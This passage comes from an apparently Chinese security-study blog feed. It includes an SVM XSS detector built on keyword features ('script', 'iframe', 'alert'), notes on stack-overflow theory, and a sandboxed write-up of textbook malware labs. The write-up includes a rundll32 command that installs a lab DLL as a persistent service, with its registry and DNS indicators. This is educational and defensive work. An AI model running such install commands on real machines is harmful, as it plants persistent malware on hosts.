class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取数据</span><br>normal_data = pd.read_csv(<span class="hljs-string">&#x27;./data/data52101/dmzo_nomal.csv&#x27;</span>, header=<span class="hljs-literal">None</span>)<br>xss_data = pd.read_csv(<span class="hljs-string">&#x27;./data/data52101/xssed.csv&#x27;</span>, header=<span class="hljs-literal">None</span>)<br><br><span class="hljs-comment"># 创建标签</span><br>normal_data[<span class="hljs-string">&#x27;label&#x27;</span>] = <span class="hljs-number">0</span>  <span class="hljs-comment"># 0 表示正常语句</span><br>xss_data[<span class="hljs-string">&#x27;label&#x27;</span>] = <span class="hljs-number">1</span>     <span class="hljs-comment"># 1 表示攻击性语句</span><br><br><span class="hljs-comment"># 合并数据</span><br>data = pd.concat([normal_data, xss_data], ignore_index=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 转换为小写</span><br>data[<span class="hljs-number">0</span>] = data[<span class="hljs-number">0</span>].<span class="hljs-built_in">str</span>.lower()<br><br><span class="hljs-comment"># 打印前五行数据</span><br><span class="hljs-built_in">print</span>(data.head())<br><span class="hljs-comment"># 打印后五行数据</span><br><span class="hljs-built_in">print</span>(data.tail())<br><br><span class="hljs-comment"># 特征提取</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_features</span>(<span class="hljs-params">text</span>):<br>    script_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;script&#x27;</span>, text, re.I))<br>    java_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;java&#x27;</span>, text, re.I))<br>    iframe_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;iframe&#x27;</span>, text, re.I))<br>    alert_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;alert&#x27;</span>, text, re.I))<br>    lt_count = text.count(<span class="hljs-string">&#x27;&lt;&#x27;</span>)<br>    gt_count = text.count(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>    double_quote_count = text.count(<span class="hljs-string">&#x27;\&quot;&#x27;</span>)<br>    single_quote_count = text.count(<span class="hljs-string">&quot;\&#x27;&quot;</span>)<br>    percent_count = text.count(<span class="hljs-string">&#x27;%&#x27;</span>)<br>    left_parenthesis_count = text.count(<span class="hljs-string">&#x27;(&#x27;</span>)<br>    right_parenthesis_count = text.count(<span class="hljs-string">&#x27;)&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [script_count, java_count, iframe_count, lt_count,alert_count, gt_count, double_quote_count,<br>            single_quote_count, percent_count, left_parenthesis_count, right_parenthesis_count]<br><br>data[<span class="hljs-string">&#x27;features&#x27;</span>] = data[<span class="hljs-number">0</span>].apply(extract_features)<br></code></pre></td></tr></table></figure><h1 id="模型训练">3 模型训练</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将数据拆分为特征和标签</span><br>X = <span class="hljs-built_in">list</span>(data[<span class="hljs-string">&#x27;features&#x27;</span>])<br>y = data[<span class="hljs-string">&#x27;label&#x27;</span>]<br><br><span class="hljs-comment"># 拆分数据集为训练集和测试集</span><br>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># 创建SVM分类器</span><br>svm_classifier = SVC(kernel=<span class="hljs-string">&#x27;linear&#x27;</span>)<br><br><span class="hljs-comment"># 训练模型，并加入进度条</span><br>num_epochs = <span class="hljs-number">100</span>  <span class="hljs-comment"># 设置训练迭代次数</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(num_epochs), desc=<span class="hljs-string">&quot;Training SVM&quot;</span>):<br>    svm_classifier.fit(X_train, y_train)<br><br><span class="hljs-comment"># 保存训练好的模型到文件</span><br>joblib.dump(svm_classifier, <span class="hljs-string">&#x27;work/svm_model.pkl&#x27;</span>)<br><br><span class="hljs-comment"># 预测测试集</span><br>y_pred = svm_classifier.predict(X_test)<br></code></pre></td></tr></table></figure><h1 id="模型评估">4 模型评估</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 计算准确率和召回率</span><br>accuracy = accuracy_score(y_test, y_pred)<br>recall = recall_score(y_test, y_pred)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;准确率: <span class="hljs-subst">&#123;accuracy:<span class="hljs-number">.10</span>f&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;召回率: <span class="hljs-subst">&#123;recall:<span class="hljs-number">.10</span>f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="测试">5 测试</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 加载已保存的模型</span><br>loaded_model = joblib.load(<span class="hljs-string">&#x27;work/svm_model.pkl&#x27;</span>)<br><br><span class="hljs-comment"># 输入数据测试</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_safe</span>(<span class="hljs-params">user_input, model</span>):<br>    features = extract_features(user_input)<br>    prediction = model.predict([features])<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;安全&quot;</span> <span class="hljs-keyword">if</span> prediction[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;不安全&quot;</span><br><br>user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要检测的语句: &quot;</span>)<br><span class="hljs-built_in">print</span>(user_input)<br>user_input = user_input.lower()<br>result = is_safe(user_input, loaded_model)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;result&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
      <category>实践篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH4-软件漏洞-缓冲区溢出</title>
    <link href="/2023/10/15/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/04%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <url>/2023/10/15/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/04%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="概述">4.1 概述</h1><p><strong>漏洞定义：</strong>可以被攻击利用的系统弱点</p><p><strong>漏洞攻击过程：</strong>漏洞发现、漏洞分析、漏洞利用</p><p><strong>漏洞造成后果：</strong>以匿名身份直接获取系统最高权限；从普通用户提升为管理员用户；实施远程拒绝服务攻击等</p><h1 id="典型的漏洞类型">4.2 典型的漏洞类型</h1><h2 id="栈溢出">4.2.1 栈溢出</h2><h3 id="栈溢出原理">1.栈溢出原理</h3><p>当程序运行时，计算机会在内存区域中开辟一段连续的内存块，包括代码段、数据段和堆栈段三部分。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310151742321.png"alt="image-20231015162805933" /><figcaption aria-hidden="true">image-20231015162805933</figcaption></figure><p>程序在内存中的存放形式</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310151742323.png"alt="image-20231015163018123" /><figcaption aria-hidden="true">image-20231015163018123</figcaption></figure><ul><li>代码段(.text)：也称文本段(TextSegment)，存放着程序的机器码和只读数据，可执行指令就是从这里取得的，这个段在内存中一般被标记为只读，任何对该区的写操作都会导致段错误(SegmentationFault)</li><li>数据段：包括已初始化的数据段(.data)和未初始化的数据段(.bss)，前者用来存放保存全局的和静态的已初始化变量，后者用来保存全局的和静态的未初始化变量。数据段在编译时分配。</li><li>堆（Heap）：向<strong>高</strong>地址扩展的数据结构，是不连续的内存区域。动态分配，其空间的分配和释放都由程序员控制。也就是说，堆的大小并不固定，可动态扩张或缩减，其分配由<code>malloc()</code>等这类实时内存分配函数来实现。当进程调用<code>malloc()</code>等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用<code>free()</code>等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</li><li>栈（Stack）：向<strong>低</strong>地址扩展的数据结构，是一块连续的内存区域。一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。由编译器自动管理，其分配方式有两种：静态分配和动态分配。静态分配由编译器完成，比如局部变量的分配。动态分配由<code>alloca()</code>函数进行分配，但是栈的动态分配和堆是不同的，它的动态分配是由编译器进行释放，无需手工控制。</li></ul><p>实例：假设一个程序的函数调用顺序为：主函数main调用函数func1，函数func1调用函数func2。当这个程序被操作系统调入内存运行时，其对应的进程在内存中的映射结果如下图所示。进程的<strong>栈</strong>是由多个<strong>栈帧</strong>构成的，其中每个<strong>栈帧</strong>都对应一个<strong>函数调用</strong>。当调用函数时，新的栈帧被压入栈；当函数返回时，相应的栈帧从栈中弹出。各函数的栈帧大小随着函数的性质的不同而不等，由函数的局部变量的数目决定。由于需要将函数返回地址这样的重要数据保存在程序员可见的堆栈中，因此也给系统安全带来了极大的隐患。</p><p>如果在堆栈中压入的数据超过预先给堆栈分配的容量时，就会出现堆栈溢出，从而使得程序运行失败；如果发生溢出的是大型程序还有可能会导致系统崩溃。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310151742324.png"alt="image-20231015163904871" /><figcaption aria-hidden="true">image-20231015163904871</figcaption></figure><p><strong>栈帧：</strong>某个函数运行时，机器需要分配一定的内存去进行函数内的各种操作，这个过程中分配的那部分栈称为栈帧。下图描述了栈帧的通用结构。栈帧是一段有界限的内存区间，由最顶端的两个指针界定，寄存器%ebp为帧指针，而寄存器%esp为栈指针。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310151742325.png"alt="image-20231015165704058" /><figcaption aria-hidden="true">image-20231015165704058</figcaption></figure><h3 id="函数调用机制">2.函数调用机制</h3><ol type="1"><li><p><strong>从右至左</strong>依次把被调函数需要的参数压入栈</p></li><li><p>使用call指令调用被调函数，并把call指令的下一条指令的地址作为返回地址压入栈中（该压栈操作隐含在call指令中）。call指令完成两项操作：一是将返回地址（call指令下一条指令地址）压入栈，二是跳转到调用函数入口处</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-keyword">call</span> 被调用函数地址<br><span class="hljs-meta"># 等价操作</span><br><span class="hljs-keyword">push</span> 返回地址<br><span class="hljs-keyword">jmp</span>  被调用函数地址<br></code></pre></td></tr></table></figure></li><li><p>进入被调函数执行。被调函数会先保存调用者函数的栈底地址（<code>push ebp</code>），然后进行栈帧切换，把调用者函数的栈顶切换成被调函数的栈底，即调用函数的栈顶就是当前被调函数的栈底（<code>mov ebp，esp</code>）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">push</span> <span class="hljs-built_in">ebp</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span><br></code></pre></td></tr></table></figure></li><li><p>为局部变量和临时变量开辟存储空间。先定义的变量先入栈，后定义的变量后入栈。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">sub</span> <span class="hljs-built_in">esp</span>，xxx<br></code></pre></td></tr></table></figure></li><li><p>函数调用返回</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"># 恢复栈帧<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">esp</span>,<span class="hljs-built_in">ebp</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebp</span><br># 返回调用者函数执行<br><span class="hljs-keyword">ret</span>  # 等价于<span class="hljs-keyword">pop</span> <span class="hljs-built_in">eip</span><br></code></pre></td></tr></table></figure></li></ol><p>实例：C程序每条语句对寄存器的影响情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br><span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> j = <span class="hljs-number">16</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, add(i, j));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr class="header"><th style="text-align: center;">汇编</th><th style="text-align: center;">影响</th><th style="text-align: center;">受影响的寄存器取值</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">mov dword ptr [i],0Ah</td><td style="text-align: center;">EIP</td><td style="text-align: center;">EIP = 00A818CC</td></tr><tr class="even"><td style="text-align: center;">mov dword ptr [j],10h</td><td style="text-align: center;">EIP</td><td style="text-align: center;">EIP = 00A818D3</td></tr><tr class="odd"><td style="text-align: center;">mov eax,dword ptr [j]</td><td style="text-align: center;">EAX;EIP</td><td style="text-align: center;">EAX = 00000010;EIP = 00A818D6</td></tr><tr class="even"><td style="text-align: center;">push eax</td><td style="text-align: center;">ESP-4;EIP</td><td style="text-align: center;">ESP = 00EFF958;EIP = 00A818D7</td></tr><tr class="odd"><td style="text-align: center;">mov ecx,dword ptr [i]</td><td style="text-align: center;">ECX;EIP</td><td style="text-align: center;">ECX = 0000000A;EIP = 00A818DA</td></tr><tr class="even"><td style="text-align: center;">push ecx</td><td style="text-align: center;">ESP-4;EIP</td><td style="text-align: center;">ESP = 00EFF954;EIP = 00A818DB</td></tr><tr class="odd"><td style="text-align: center;">push ebp</td><td style="text-align: center;">ESP-4;EIP</td><td style="text-align: center;">ESP = 00EFF94C;EIP = 00A81771</td></tr><tr class="even"><td style="text-align: center;">mov ebp,esp</td><td style="text-align: center;">EBP=ESP;EIP</td><td style="text-align: center;">EBP = 00EFF94C;EIP = 00A81773</td></tr><tr class="odd"><td style="text-align: center;">mov eax,dword ptr [a]</td><td style="text-align: center;">EAX;EIP</td><td style="text-align: center;">EAX = 0000000A;EIP = 00A81794</td></tr><tr class="even"><td style="text-align: center;">add eax,dword ptr [b]</td><td style="text-align: center;">EAX;EIP</td><td style="text-align: center;">EAX = 0000001A;EIP = 00A81797</td></tr><tr class="odd"><td style="text-align: center;">mov esp,ebp</td><td style="text-align: center;">ESP=EBP；EIP</td><td style="text-align: center;">EIP = 00A817A9</td></tr><tr class="even"><td style="text-align: center;">pop ebp</td><td style="text-align: center;">EBP;ESP+4;EIP</td><td style="text-align: center;">EBP = 00B8F9CC;ESP = 00B8F8DC;EIP =00A817AA</td></tr><tr class="odd"><td style="text-align: center;">ret</td><td style="text-align: center;">ESP+4;EIP</td><td style="text-align: center;">ESP = 00B8F8E0;EIP = 00A818E0</td></tr><tr class="even"><td style="text-align: center;">add esp,8</td><td style="text-align: center;">ESP+8;EFL;EIP</td><td style="text-align: center;">ESP = 00B8F8E8;EFL = 00000206;EIP =00A818E3</td></tr></tbody></table><h2 id="堆溢出">4.2.2 堆溢出</h2><h2 id="格式化串漏洞">4.2.3 格式化串漏洞</h2><h2 id="整型溢出">4.2.4 整型溢出</h2><h2 id="释放再使用">4.2.5 释放再使用</h2><h1 id="溢出漏洞利用原理">4.3 溢出漏洞利用原理</h1><h2 id="溢出攻击的基本流程">4.3.1 溢出攻击的基本流程</h2><ol type="1"><li>注入恶意数据</li><li>溢出缓冲区</li><li>重定向控制流</li><li>执行有效载荷</li></ol><h2 id="溢出利用的关键技术">4.3.2 溢出利用的关键技术</h2><ul><li>溢出点定位</li><li>覆盖执行控制地址</li><li>覆盖异常处理结构</li><li>跳转地址的确定</li><li>Shellcode定位和跳转</li></ul><h1 id="漏洞利用保护机制">4.4 漏洞利用保护机制</h1><ul><li>GS编译保护机制</li><li>SafeSEH保护机制</li><li>DEP机制</li><li>ASLR机制</li></ul><p>参考教程：</p><ol type="1"><li><a href="https://zhuanlan.zhihu.com/p/186812518">一文理解缓冲区溢出- 知乎 (zhihu.com)</a></li><li>https://blog.csdn.net/xbb224007/article/details/80106961</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Chapter_3L</title>
    <link href="/2023/10/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%AE%9E%E9%AA%8C%E7%AF%87/Chapter_3L/"/>
    <url>/2023/10/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%AE%9E%E9%AA%8C%E7%AF%87/Chapter_3L/</url>
    
    <content type="html"><![CDATA[<h1 id="lab-03-01">Lab 03-01</h1><h2 id="简要答案">简要答案</h2><p>Q1：找出这个恶意代码的导入函数与字符串列表?</p><p>Q2：这个恶意代码在主机上的感染迹象特征是什么?</p><p>Q3：这个恶意代码是否存在一些有用的网络特征码？如果存在，它们是什么？</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122856.png"alt="image-20231014085930356" /><figcaption aria-hidden="true">image-20231014085930356</figcaption></figure><h2 id="详细分析">详细分析</h2><p>首先用PEiD打开<code>Lab03-01.exe</code>，可以看到<code>Lab03-01.exe</code>是加壳的.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122857.png"alt="image-20231012162113880" /><figcaption aria-hidden="true">image-20231012162113880</figcaption></figure><p>查看导入表，唯一的导入函数是<code>ExitProcess</code>.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122858.png"alt="image-20231012162344159" /><figcaption aria-hidden="true">image-20231012162344159</figcaption></figure><p>Strings查看字符串，因为文件加壳，所以有很多不可识别字符串，但我们还是可以看到一些可能有用的信息，如：注册表、网址等.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122859.png"alt="image-20231013184322657" /><figcaption aria-hidden="true">image-20231013184322657</figcaption></figure><p>先运行进程监视器、进程浏览器、Wireshark，再运行<code>Lab03-01.exe</code>.使用进程浏览器查看<code>Lab03-01.exe</code>的Handles，发现其创建了一个互斥量，恶意程序经常进行该操作，从而在某个时刻独占某个计算机资源.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122860.png"alt="image-20231013184906179" /><figcaption aria-hidden="true">image-20231013184906179</figcaption></figure><p>再查看该程序的DLLs，下图框选的两个动态链接库说明程序有联网操作.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122861.png"alt="image-20231013185452760" /><figcaption aria-hidden="true">image-20231013185452760</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122863.png"alt="image-20231014085102970" /><figcaption aria-hidden="true">image-20231014085102970</figcaption></figure><p>使用进程监视器设置过滤条件，以查看恶意代码对文件系统和注册表的修改操作.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122864.png"alt="image-20231013185649467" /><figcaption aria-hidden="true">image-20231013185649467</figcaption></figure><p>Seed表明该程序可能会有一些随机数相关的操作；程序创建了一个可执行文件<code>vmx32to64</code>；加入了一个自启动项<code>VideoDriver</code>.我们经常需要筛选出一定数量的噪声，<code>HKLM\SOFTARE\Microsoft\Cryptography\RNG\Seed</code>键值上的 <code>RegSetValue</code>操作是典型的噪声.因为随机数发生器的种子会有软件在注册表中不停地更新.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122865.png"alt="image-20231013190041973" /><figcaption aria-hidden="true">image-20231013190041973</figcaption></figure><p>查看自启动项关联的可执行文件，比对大小（或比对md5值），发现刚好与<code>Lab03-01.exe</code>相同，可以判断它们就是同一个程序.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122866.png"alt="image-20231013191125258" /><figcaption aria-hidden="true">image-20231013191125258</figcaption></figure><p>查看wireshark，可以看到在不断进行www.practicalmalwareanalysis.com的域名解析.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122867.png"alt="image-20231013192113703" /><figcaption aria-hidden="true">image-20231013192113703</figcaption></figure><h1 id="lab-03-02">Lab 03-02</h1><h2 id="简要答案-1">简要答案</h2><p>Q1：你怎样才能让这个恶意代码自行安装？</p><p>Q2：在安装之后，你如何让这个恶意代码运行起来？</p><p>Q3：你怎么能找到这个恶意代码是在哪个进程下运行的？</p><p>Q4：你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？</p><p>Q5：这个恶意代码在主机上的感染迹象特征是什么？</p><p>Q6：这个恶意代码是否存在一些有用的网络特征码？</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122868.png"alt="image-20231014104724395" /><figcaption aria-hidden="true">image-20231014104724395</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122869.png"alt="image-20231014104745673" /><figcaption aria-hidden="true">image-20231014104745673</figcaption></figure><h2 id="详细分析-1">详细分析</h2><p>使用PEiD分析其导出表、导入表.导出函数<code>ServiceMain</code>表明，这个恶意代码需要安装成一个服务，使其能够正常运行.这里包括了一些服务操作函数，比如<code>CreateService</code>，以及一些注册表操作函数，如函数<code>RegSetValueEX</code>.导入的网络操作函数，如<code>HttpSendRequest</code>等，表明恶意代码使用了HTTP.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122870.png"alt="image-20231014084906992" /><figcaption aria-hidden="true">image-20231014084906992</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122871.png"alt="image-20231014085536840" /><figcaption aria-hidden="true">image-20231014085536840</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122872.png"alt="image-20231014085613379" /><figcaption aria-hidden="true">image-20231014085613379</figcaption></figure><p>使用strings检查字符串列表.我们看到了一些有趣的字符串，包括注册表位置、域名、一些独特的字符串如<code>IPRIP</code>和<code>serve.html</code>，以及一些编码的字符串.动态分析基础技术可能会告诉我们这些字符串和导入函数如何被使用的.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122873.png"alt="image-20231013193555611" /><figcaption aria-hidden="true">image-20231013193555611</figcaption></figure><p>先用Regshot对注册表做个基线快照，并且使用ProcessExplorer来监控在系统上运行的进程，然后使用<code>rundll32.exe</code>来安装恶意代码，在安装完恶意代码之后，我们使用ProcessExplorer，来确定<code>rundll32.exe</code>已经终止，不在进程列表中了.然后，我们用Regshot工具做第二个快照，来看看恶意代码是否已经在注册表中安装自身了.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 利用rundll32.exe 工具，使用命令 rundll32.exe Lab03-01.dll,installA</span><br><span class="hljs-comment"># 运行恶意代码导出函数便可将恶意代码安装为一个服务.</span><br><span class="hljs-comment"># installA从前面静态分析中得到</span><br>rundll32.exe Lab03-02.dll,installA<br></code></pre></td></tr></table></figure><p>分析快照比对结果.发现恶意代码将自身安装为<code>IPRIP</code>服务，由于这个恶意代码是一个DLL文件，它依赖于一个可执行文件来执行它.事实上，我们在看到<code>ImagePath</code>被设置为<code>svchost.exe</code>，这意味着，这个恶意代码将会在一个<code>svchost.exe</code>进程中启动.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122874.png"alt="image-20231014094117030" /><figcaption aria-hidden="true">image-20231014094117030</figcaption></figure><p>根据字符串查找的线索检查注册表项，我们可以看到其他可能被使用的服务名称，比如<code>6to4 AppNgmt</code>.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122875.png"alt="image-20231014094736934" /><figcaption aria-hidden="true">image-20231014094736934</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122876.png"alt="image-20231014094633180" /><figcaption aria-hidden="true">image-20231014094633180</figcaption></figure><p>开始进行动态分析，我们将运行procmon工具（并清除所有事件），启动ProcessExplorer，以及配置一个虚拟网络，包括ApateDNS、监听端口80的Netcat（因为我们在字符串列表中看到了HTTP）.由于这个恶意代码安装为<code>IPRIP</code>服务，我们可以使用Windows中的net命令来启动它，具体命令如下：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122877.png"alt="image-20231014095227121" /><figcaption aria-hidden="true">image-20231014095227121</figcaption></figure><p>使用进程浏览器查找恶意代码运行的进程，可以得到<code>Lab03-02.dll</code>是由PID为1052的<code>svchost.exe</code>进程加载的.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122878.png"alt="image-20231014095326064" /><figcaption aria-hidden="true">image-20231014095326064</figcaption></figure><p>在ProcessExplorer中，我们选择<code>View→Lower Pane View→DLLs</code>，选择运行为PID为1052的<code>svchost.exe</code>进程.当我们看到<code>Lab03-02.dll</code>被装载时证实了恶意代码在<code>svchost.exe</code>进程中运行.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122879.png"alt="image-20231014100153686" /><figcaption aria-hidden="true">image-20231014100153686</figcaption></figure><p>接下来，我们将注意力转移到网络分析工具上.首先，我们检查ApateDNS，查看恶意代码是否执行了DNS请求.输出结果显示了一个向<code>practicalmalwareanazysis.com</code>的DNS请求，这也匹配到了静态分析得到的字符串列表.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122880.png"alt="image-20231014102157123" /><figcaption aria-hidden="true">image-20231014102157123</figcaption></figure><p>最后分析Netcat结果来完成我们的网络分析.我们看到，恶意代码执行了一个通过80端口的HTTPGET请求（我们让Netcat在80端口上监听，是因为我们在字符串列表中看到了HTTP）.我们多次运行这个测试，数据显示结果对每次运行都是一致的（未能成功观测到）.</p><h1 id="lab-03-03">Lab 03-03</h1><p>Q1：当你使用Process Explorer工具进行监视时，你注意到了什么?</p><p>Q2：你可以找出任何的内存修改行为吗?</p><p>Q3：这个恶意代码在主机上的感染迹象特征是什么?</p><p>Q4：这个恶意代码的目的是什么?</p><h2 id="简要答案-2">简要答案</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122881.png"alt="image-20231014105200733" /><figcaption 